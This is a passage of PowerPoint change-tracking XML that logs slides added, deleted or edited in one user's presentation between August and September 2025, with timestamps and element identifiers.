      <pc:sldChg chg="add del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-01T07:22:11.711" v="159" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2699923794" sldId="327"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-01T07:22:11.711" v="159" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="433288509" sldId="328"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-07T07:54:46.334" v="481" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3086099777" sldId="329"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modNotesTx">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-14T05:19:25.089" v="569" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="205875540" sldId="330"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modNotesTx">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-14T05:22:03.368" v="571" actId="113"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3532902236" sldId="331"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modNotesTx">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-12T03:03:22.580" v="551" actId="5793"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3882018338" sldId="332"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod modNotesTx">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-19T02:48:30.178" v="742" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1973226208" sldId="333"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-07T07:55:24.568" v="482" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3782012304" sldId="334"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-07T07:55:24.568" v="482" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2373360171" sldId="335"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-07T07:55:24.568" v="482" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3581078299" sldId="336"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-07T07:55:24.568" v="482" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2121030151" sldId="337"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-07T07:55:24.568" v="482" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4207946135" sldId="338"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-07T07:55:24.568" v="482" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="9154565" sldId="339"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="delSp modSp add del mod setBg">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-07T07:55:24.568" v="482" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="749975542" sldId="340"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="delSp add del mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-07T07:55:24.568" v="482" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1982271875" sldId="341"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-19T02:49:03.250" v="745" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1680385190" sldId="343"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T07:28:27.239" v="1122" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2840111696" sldId="353"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:31:00.618" v="1048" actId="22"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2766226136" sldId="354"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-26T02:36:14.868" v="1131" actId="255"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3364655596" sldId="356"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T07:29:55.066" v="1126" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3364655596" sldId="356"/>
            <ac:spMk id="2" creationId="{F558D407-2531-52A9-812D-EC1390FC07F9}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-26T02:36:14.868" v="1131" actId="255"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3364655596" sldId="356"/>
            <ac:spMk id="3" creationId="{CED08369-F824-5199-FFB5-35CC70AD83DD}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:34:11.245" v="1063" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3840237434" sldId="357"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-28T05:11:19.823" v="1381" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2842887909" sldId="363"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add del mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-09-01T04:55:52.116" v="1559" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4200885447" sldId="365"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del modNotesTx">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-28T03:13:46.509" v="1362" actId="113"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1228348565" sldId="366"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add del mod modNotesTx">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-28T02:43:23.728" v="1335" actId="6549"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4109790615" sldId="367"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-28T02:41:29.499" v="1330"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4109790615" sldId="367"/>
            <ac:spMk id="2" creationId="{50420C95-D82A-FEA7-3691-0B268915569F}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-28T02:43:12.065" v="1334" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4109790615" sldId="367"/>
            <ac:spMk id="3" creationId="{B38BBC19-958D-E915-847F-BCAEBC07E49F}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-28T02:28:59.823" v="1326" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1868746506" sldId="368"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-28T05:11:26.858" v="1382" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="997708108" sldId="369"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-28T05:11:37.040" v="1384" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2612199314" sldId="370"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-28T05:11:31.990" v="1383" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3570495698" sldId="371"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-28T05:11:43.157" v="1385" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3898282981" sldId="372"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-28T05:11:43.157" v="1385" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2327734322" sldId="373"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-28T02:29:44.171" v="1327" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3653529665" sldId="374"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-28T02:29:44.171" v="1327" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2806802655" sldId="375"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:35:05.873" v="1064" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2187541154" sldId="376"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:35:05.873" v="1064" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1086989965" sldId="377"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:35:45.974" v="1068" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2318804101" sldId="378"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:35:45.974" v="1068" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2821694891" sldId="379"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:35:41.731" v="1067" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="902125572" sldId="380"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:35:41.731" v="1067" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2721915819" sldId="381"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:35:41.731" v="1067" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="117826477" sldId="382"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-28T02:29:44.171" v="1327" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="123246795" sldId="383"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:24:35.075" v="1291" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2300571453" sldId="384"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:24:35.075" v="1291" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3658194249" sldId="385"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:24:35.075" v="1291" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="127110326" sldId="386"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:24:35.075" v="1291" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1247264017" sldId="387"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:27:28.062" v="1299" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1154021989" sldId="388"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:27:28.062" v="1299" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2292202308" sldId="389"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:27:37.997" v="1303" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2039936826" sldId="391"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:27:37.997" v="1303" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2039936826" sldId="391"/>
            <ac:spMk id="2" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:27:45.729" v="1309" actId="6549"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3175865683" sldId="392"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:27:45.729" v="1309" actId="6549"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3175865683" sldId="392"/>
            <ac:spMk id="2" creationId="{00000000-0000-0000-0000-000000000000}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:35:34.296" v="1066" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="858990549" sldId="393"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modNotesTx">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-09-01T04:47:28.180" v="1557" actId="6549"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="202791497" sldId="394"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:24:35.075" v="1291" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1781350296" sldId="396"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:27:28.062" v="1299" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2826515425" sldId="397"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:27:54.217" v="1310" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2889022930" sldId="398"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:27:54.217" v="1310" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3833381593" sldId="399"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:27:54.217" v="1310" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2322524510" sldId="400"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:27:54.217" v="1310" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="205502994" sldId="401"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:27:57.211" v="1311" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1493090324" sldId="402"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-09-01T04:57:09.300" v="1560" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1509330583" sldId="403"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:28:06.167" v="1313" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4274635396" sldId="404"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:28:05.077" v="1312" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="320966846" sldId="405"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:28:57.985" v="1314" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="344629861" sldId="406"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:29:04.833" v="1315" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2713655294" sldId="407"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del modNotes">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:29:11.847" v="1316" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3705730958" sldId="408"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:29:15.305" v="1317" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="643397993" sldId="409"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:29:16.490" v="1318" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3365017874" sldId="410"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:29:17.523" v="1319" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3742066403" sldId="411"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:29:19.066" v="1320" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3971345843" sldId="412"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-27T18:29:20.700" v="1321" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3506758481" sldId="413"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:38:26.739" v="1072" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3630014687" sldId="414"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{709D6B7F-212A-412D-B87A-2E49D3307CFC}" dt="2025-08-25T05:38:26.739" v="1072" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3194961477" sldId="415"/>
        </pc:sldMkLst>
